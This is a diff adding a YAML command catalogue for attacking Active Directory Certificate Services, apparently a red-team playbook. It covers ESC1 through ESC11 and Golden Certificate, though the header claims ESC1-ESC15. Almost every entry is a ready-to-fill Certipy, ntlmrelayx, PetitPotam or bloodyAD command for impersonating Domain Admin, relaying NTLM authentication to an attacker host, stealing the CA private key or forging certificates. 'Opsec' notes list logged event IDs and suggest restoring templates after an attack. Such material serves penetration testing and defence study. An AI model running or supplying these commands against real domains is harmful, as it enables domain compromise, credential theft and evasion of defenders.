@@ -1,0 +1,194 @@
+# ADCS (Active Directory Certificate Services) Abuse Commands
+# ESC1-ESC15 attacks using Certipy
+
+ESC1:
+  description: "Template allows SAN (Subject Alternative Name) - impersonate any user"
+  commands:
+    - name: "Request certificate as Domain Admin"
+      tool: Certipy
+      command: |
+        certipy req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -dc-ip <DC_IP>
+    - name: "Authenticate with certificate"
+      tool: Certipy
+      command: |
+        certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+    - name: "Pass-the-cert to get TGT"
+      tool: Certipy
+      command: |
+        certipy auth -pfx administrator.pfx -dc-ip <DC_IP> -ldap-shell
+  opsec:
+    - "Certificate request logged in CA event logs"
+    - "Event ID 4886 (certificate request)"
+    - "Event ID 4887 (certificate issued)"
+
+ESC2:
+  description: "Template allows any purpose or no EKU - use for client auth"
+  commands:
+    - name: "Request certificate"
+      tool: Certipy
+      command: |
+        certipy req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -dc-ip <DC_IP>
+    - name: "Authenticate with certificate"
+      tool: Certipy
+      command: |
+        certipy auth -pfx <USERNAME>.pfx -dc-ip <DC_IP>
+  opsec:
+    - "Certificate request logged in CA event logs"
+    - "Any Purpose EKU can be detected by auditing"
+
+ESC3:
+  description: "Enrollment agent template abuse - request certs on behalf of others"
+  commands:
+    - name: "Request enrollment agent certificate"
+      tool: Certipy
+      command: |
+        certipy req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -dc-ip <DC_IP>
+    - name: "Request certificate on behalf of Domain Admin"
+      tool: Certipy
+      command: |
+        certipy req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template 'User' -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx -dc-ip <DC_IP>
+    - name: "Authenticate as Domain Admin"
+      tool: Certipy
+      command: |
+        certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+  opsec:
+    - "Two certificate requests visible in logs"
+    - "Certificate Agent OID visible in issued cert"
+
+ESC4:
+  description: "Template with vulnerable ACL - modify template to enable ESC1"
+  commands:
+    - name: "Modify template to allow SAN"
+      tool: Certipy
+      command: |
+        certipy template -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -template '<TEMPLATE>' -save-old -dc-ip <DC_IP>
+    - name: "Request certificate as Domain Admin"
+      tool: Certipy
+      command: |
+        certipy req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -dc-ip <DC_IP>
+    - name: "Restore original template"
+      tool: Certipy
+      command: |
+        certipy template -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -template '<TEMPLATE>' -configuration '<TEMPLATE>.json' -dc-ip <DC_IP>
+  opsec:
+    - "Template modification creates Event ID 5136"
+    - "Consider restoring template after attack"
+
+ESC6:
+  description: "CA with EDITF_ATTRIBUTESUBJECTALTNAME2 flag - specify SAN in any request"
+  commands:
+    - name: "Request certificate with arbitrary SAN"
+      tool: Certipy
+      command: |
+        certipy req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template 'User' -upn 'Administrator@<DOMAIN>' -dc-ip <DC_IP>
+    - name: "Authenticate with certificate"
+      tool: Certipy
+      command: |
+        certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+  opsec:
+    - "Certificate request logged with specified SAN"
+    - "Works with any template that allows enrollment"
+
+ESC7:
+  description: "CA with ManageCA/ManageCertificates rights - approve pending requests or issue certs"
+  commands:
+    - name: "Enable SAN flag on CA (ManageCA)"
+      tool: Certipy
+      command: |
+        certipy ca -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -enable-template 'SubCA' -dc-ip <DC_IP>
+    - name: "Request SubCA certificate"
+      tool: Certipy
+      command: |
+        certipy req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template 'SubCA' -dc-ip <DC_IP>
+    - name: "Issue pending request (ManageCertificates)"
+      tool: Certipy
+      command: |
+        certipy ca -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -issue-request <REQUEST_ID> -dc-ip <DC_IP>
+  opsec:
+    - "CA configuration changes are logged"
+    - "Pending request approval is logged"
+
+ESC8:
+  description: "NTLM relay to AD CS HTTP endpoint"
+  commands:
+    - name: "Start NTLM relay to AD CS"
+      tool: Impacket
+      command: |
+        ntlmrelayx.py -t http://<CA_SERVER>/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'
+    - name: "Coerce authentication (PetitPotam)"
+      tool: PetitPotam
+      command: |
+        python3 PetitPotam.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' <ATTACKER_IP> <DC_IP>
+    - name: "Authenticate with certificate"
+      tool: Certipy
+      command: |
+        certipy auth -pfx dc.pfx -dc-ip <DC_IP>
+  opsec:
+    - "Requires NTLM relay position"
+    - "HTTP to CA must not require HTTPS"
+    - "EPA (Extended Protection for Authentication) blocks this"
+
+ESC9:
+  description: "No security extension (msPKI-Enrollment-Flag) - generic mapping allows impersonation"
+  commands:
+    - name: "Modify userPrincipalName to target"
+      tool: bloodyAD
+      command: |
+        bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set object <CONTROLLED_USER> userPrincipalName -v 'Administrator'
+    - name: "Request certificate"
+      tool: Certipy
+      command: |
+        certipy req -u '<CONTROLLED_USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -dc-ip <DC_IP>
+    - name: "Restore UPN and authenticate"
+      tool: Certipy
+      command: |
+        certipy auth -pfx administrator.pfx -domain <DOMAIN> -dc-ip <DC_IP>
+  opsec:
+    - "UPN change creates Event ID 5136"
+    - "Certificate request logs show modified UPN"
+
+ESC10:
+  description: "Weak certificate mapping - SAN mapped to UPN allows impersonation"
+  commands:
+    - name: "Same as ESC9"
+      tool: Certipy
+      command: |
+        certipy req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -dc-ip <DC_IP>
+  opsec:
+    - "Certificate request logged"
+    - "Requires specific CA configuration"
+
+ESC11:
+  description: "NTLM relay to ICPR (RPC) - relay to CA RPC interface"
+  commands:
+    - name: "Start NTLM relay to CA RPC"
+      tool: Impacket
+      command: |
+        ntlmrelayx.py -t 'rpc://<CA_SERVER>' -rpc-mode ICPR -icpr-ca-name '<CA_NAME>' -smb2support
+    - name: "Coerce authentication"
+      tool: PetitPotam
+      command: |
+        python3 PetitPotam.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' <ATTACKER_IP> <DC_IP>
+  opsec:
+    - "Similar to ESC8 but uses RPC"
+    - "RPC signing can block this attack"
+
+GoldenCert:
+  description: "Steal CA private key - forge any certificate"
+  commands:
+    - name: "Backup CA"
+      tool: Certipy
+      command: |
+        certipy ca -u '<ADMIN_USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -backup -dc-ip <DC_IP>
+    - name: "Forge certificate for Domain Admin"
+      tool: Certipy
+      command: |
+        certipy forge -ca-pfx <CA_NAME>.pfx -upn 'Administrator@<DOMAIN>' -subject 'CN=Administrator,CN=Users,DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>'
+    - name: "Authenticate with forged certificate"
+      tool: Certipy
+      command: |
+        certipy auth -pfx administrator_forged.pfx -dc-ip <DC_IP>
+  opsec:
+    - "Requires local admin on CA server"
+    - "CA backup is logged"
+    - "Forged certificates not logged on CA"
